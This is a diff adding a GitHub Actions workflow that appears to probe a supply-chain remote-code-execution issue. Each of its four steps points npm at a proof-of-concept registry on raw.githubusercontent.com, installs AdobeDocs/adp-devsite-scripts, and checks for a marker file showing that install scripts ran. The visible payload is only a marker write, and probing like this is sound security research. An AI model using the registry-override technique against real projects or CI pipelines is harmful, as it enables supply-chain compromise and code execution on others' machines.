@@ -1,0 +1,55 @@
+name: npmprobe
+on:
+  workflow_dispatch:
+  push:
+    branches: [main]
+permissions:
+  pull-requests: write
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: versions
+        run: node -v; npm -v
+
+      - name: A control - npmrc registry only
+        run: |
+          rm -rf "$RUNNER_TEMP/a" && mkdir -p "$RUNNER_TEMP/a" && cd "$RUNNER_TEMP/a"
+          rm -f /tmp/ADP_RCE_MARKER
+          printf 'registry=https://raw.githubusercontent.com/PDFtoMark/gab-poc-npmreg/main/v2/\naudit=false\nfund=false\nprogress=false\n' > .npmrc
+          npm install --no-save github:AdobeDocs/adp-devsite-scripts > a.log 2>&1 || echo NPM_EXIT_NONZERO
+          grep -E 'gray-matter|install-scripts|added ' a.log | tail -6
+          if [ -f /tmp/ADP_RCE_MARKER ]; then echo RESULT_A=RAN; else echo RESULT_A=BLOCKED; fi
+
+      - name: B npmrc allow-scripts
+        run: |
+          rm -rf "$RUNNER_TEMP/b" && mkdir -p "$RUNNER_TEMP/b" && cd "$RUNNER_TEMP/b"
+          rm -f /tmp/ADP_RCE_MARKER
+          printf 'registry=https://raw.githubusercontent.com/PDFtoMark/gab-poc-npmreg/main/v2/\nallow-scripts=gray-matter\naudit=false\nfund=false\nprogress=false\n' > .npmrc
+          npm install --no-save github:AdobeDocs/adp-devsite-scripts > b.log 2>&1 || echo NPM_EXIT_NONZERO
+          grep -E 'gray-matter|install-scripts|added ' b.log | tail -6
+          if [ -f /tmp/ADP_RCE_MARKER ]; then echo RESULT_B=RAN; else echo RESULT_B=BLOCKED; fi
+
+      - name: C planted package.json allowScripts
+        run: |
+          rm -rf "$RUNNER_TEMP/c" && mkdir -p "$RUNNER_TEMP/c" && cd "$RUNNER_TEMP/c"
+          rm -f /tmp/ADP_RCE_MARKER
+          printf 'registry=https://raw.githubusercontent.com/PDFtoMark/gab-poc-npmreg/main/v2/\naudit=false\nfund=false\nprogress=false\n' > .npmrc
+          printf '%s\n' '{"name":"proj","version":"1.0.0","private":true,"allowScripts":{"gray-matter":true}}' > package.json
+          npm install --no-save github:AdobeDocs/adp-devsite-scripts > c.log 2>&1 || echo NPM_EXIT_NONZERO
+          grep -E 'gray-matter|install-scripts|added ' c.log | tail -6
+          if [ -f /tmp/ADP_RCE_MARKER ]; then echo RESULT_C=RAN; else echo RESULT_C=BLOCKED; fi
+
+      - name: D root package.json postinstall only
+        run: |
+          rm -rf "$RUNNER_TEMP/d" && mkdir -p "$RUNNER_TEMP/d" && cd "$RUNNER_TEMP/d"
+          rm -f /tmp/ADP_RCE_MARKER /tmp/ROOT_MARK
+          printf 'registry=https://raw.githubusercontent.com/PDFtoMark/gab-poc-npmreg/main/v2/\naudit=false\nfund=false\nprogress=false\n' > .npmrc
+          cat > package.json <<'JSON'
+          {"name":"p2","version":"1.0.0","private":true,
+           "scripts":{"postinstall":"node -e \"require('fs').writeFileSync('/tmp/ROOT_MARK','ran')\""}}
+          JSON
+          npm install --no-save github:AdobeDocs/adp-devsite-scripts > d.log 2>&1 || echo NPM_EXIT_NONZERO
+          grep -E 'gray-matter|install-scripts|postinstall|added ' d.log | tail -6
+          if [ -f /tmp/ROOT_MARK ]; then echo RESULT_D=RAN; else echo RESULT_D=BLOCKED; fi
